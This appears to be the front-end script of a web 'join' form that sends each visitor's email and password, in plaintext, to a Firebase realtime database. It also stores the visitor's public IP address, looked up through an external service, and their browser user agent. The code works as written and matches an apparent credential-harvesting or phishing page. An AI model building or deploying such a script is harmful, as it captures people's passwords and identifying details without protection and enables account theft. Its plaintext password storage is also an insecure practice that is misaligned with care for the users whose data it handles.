import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

 const firebaseConfig = {
    apiKey: "AIzaSyC77RfgLBX9jqOaYT088HQyZC1a3O55kUc",
    authDomain: "master-roni-f17ec.firebaseapp.com",
    databaseURL: "https://master-roni-f17ec-default-rtdb.firebaseio.com",
    projectId: "master-roni-f17ec",
    storageBucket: "master-roni-f17ec.firebasestorage.app",
    messagingSenderId: "200053184974",
    appId: "1:200053184974:web:8bb3563f08e8dfc5ed339f",
    measurementId: "G-LYVBML2PV6"
  };

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

async function getUserIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip || "Unknown";
  } catch(e) {
    return "Unknown";
  }
}

document.getElementById("joinForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();
  const ip = await getUserIP();
  const userAgent = navigator.userAgent;

  const newRef = push(ref(db, "joinRequests"));
  set(newRef, {
    email,
    password,
    ip,
    userAgent,
    addedTime: Date.now()
  })
  .then(() => {
    alert("✅ Request submitted!");
    e.target.reset();
  })
  .catch(err => alert("⚠️ " + err.message));
});
